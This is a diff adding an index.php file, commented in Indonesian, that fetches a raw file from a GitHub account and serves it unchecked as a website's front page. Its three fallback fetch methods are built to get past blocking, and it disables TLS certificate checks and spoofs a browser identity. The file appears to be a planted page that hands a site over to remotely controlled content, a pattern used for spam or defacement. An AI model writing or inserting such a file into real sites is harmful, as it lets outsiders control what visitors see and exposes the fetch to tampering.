@@ -1,0 +1,145 @@
+<?php
+// ============================================
+// index.php - Proxy Konten yang Lebih Kuat
+// ============================================
+
+$url = 'https://raw.githubusercontent.com/bedorsunggal-png/dorrr/refs/heads/main/tam';
+
+/**
+ * Ambil konten dengan multi-strategi:
+ * 1. cURL (utama) + retry
+ * 2. file_get_contents dengan context
+ * 3. fsockopen manual (terakhir, jika dua-duanya diblokir)
+ */
+function ambilKonten($url, $maxRetry = 3) {
+    // Bersihkan URL dari spasi/karakter tak terlihat
+    $url = trim($url);
+    $url = preg_replace('/[\x00-\x1F\x7F]/', '', $url);
+
+    // Validasi skema
+    if (!preg_match('#^https?://#i', $url)) {
+        return false;
+    }
+
+    $headersKirim = [
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language: id,en-US;q=0.9,en;q=0.8',
+        'Cache-Control: no-cache',
+        'Pragma: no-cache',
+    ];
+
+    // ---------- Strategi 1: cURL dengan retry ----------
+    if (function_exists('curl_init')) {
+        for ($i = 0; $i < $maxRetry; $i++) {
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL               => $url,
+                CURLOPT_RETURNTRANSFER    => true,
+                CURLOPT_FOLLOWLOCATION    => true,
+                CURLOPT_MAXREDIRS         => 5,
+                CURLOPT_CONNECTTIMEOUT    => 10,
+                CURLOPT_TIMEOUT           => 30,
+                CURLOPT_SSL_VERIFYPEER    => false,
+                CURLOPT_SSL_VERIFYHOST    => 0,
+                CURLOPT_ENCODING          => '',          // auto-decompress gzip
+                CURLOPT_USERAGENT         => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
+                CURLOPT_HTTPHEADER        => $headersKirim,
+                CURLOPT_HTTP_VERSION      => CURL_HTTP_VERSION_1_1,
+                CURLOPT_TCP_KEEPALIVE     => 1,
+                CURLOPT_IPRESOLVE         => CURL_IPRESOLVE_V4, // hindari masalah IPv6 di beberapa server
+            ]);
+
+            $konten  = curl_exec($ch);
+            $code    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $errNo   = curl_errno($ch);
+            $errMsg  = curl_error($ch);
+            curl_close($ch);
+
+            if ($konten !== false && $code >= 200 && $code < 300 && $errNo === 0) {
+                return $konten;
+            }
+
+            // Backoff singkat sebelum retry
+            if ($i < $maxRetry - 1) {
+                usleep(300000); // 300 ms
+            }
+        }
+    }
+
+    // ---------- Strategi 2: file_get_contents dengan context ----------
+    if (ini_get('allow_url_fopen')) {
+        $ctx = stream_context_create([
+            'http' => [
+                'method'          => 'GET',
+                'header'          => implode("\r\n", $headersKirim) . "\r\n",
+                'user_agent'      => 'Mozilla/5.0 (compatible; PHP-Proxy)',
+                'timeout'         => 30,
+                'follow_location' => 1,
+                'max_redirects'   => 5,
+                'ignore_errors'   => true,
+            ],
+            'ssl' => [
+                'verify_peer'      => false,
+                'verify_peer_name' => false,
+            ],
+        ]);
+        $konten = @file_get_contents($url, false, $ctx);
+        if ($konten !== false && $konten !== '') {
+            return $konten;
+        }
+    }
+
+    // ---------- Strategi 3: fsockopen manual (HTTPS) ----------
+    $p = parse_url($url);
+    if (!empty($p['host'])) {
+        $scheme = $p['scheme'] ?? 'http';
+        $port   = $p['port'] ?? ($scheme === 'https' ? 443 : 80);
+        $path   = ($p['path'] ?? '/') . (isset($p['query']) ? '?' . $p['query'] : '');
+
+        $fp = @fsockopen(
+            ($scheme === 'https' ? 'ssl://' : '') . $p['host'],
+            $port,
+            $errno,
+            $errstr,
+            10
+        );
+        if ($fp) {
+            $req  = "GET {$path} HTTP/1.1\r\n";
+            $req .= "Host: {$p['host']}\r\n";
+            $req .= "User-Agent: Mozilla/5.0\r\n";
+            $req .= "Connection: close\r\n\r\n";
+            fwrite($fp, $req);
+
+            $resp = '';
+            while (!feof($fp)) {
+                $resp .= fread($fp, 8192);
+            }
+            fclose($fp);
+
+            // Buang header
+            $pos = strpos($resp, "\r\n\r\n");
+            if ($pos !== false) {
+                return substr($resp, $pos + 4);
+            }
+        }
+    }
+
+    return false;
+}
+
+// ============ EKSEKUSI ============
+$konten = ambilKonten($url);
+
+if ($konten === false || $konten === '') {
+    http_response_code(502); // Bad Gateway lebih tepat dari 500
+    header('Content-Type: text/plain; charset=utf-8');
+    die('Gagal membaca konten dari URL sumber.');
+}
+
+// Deteksi apakah konten HTML (untuk header yang tepat)
+$isHtml = (stripos(ltrim($konten), '<!doctype') === 0) || (stripos(ltrim($konten), '<html') === 0);
+header('Content-Type: ' . ($isHtml ? 'text/html' : 'text/plain') . '; charset=utf-8');
+header('X-Content-Type-Options: nosniff');
+header('Cache-Control: no-store');
+
+echo $konten;
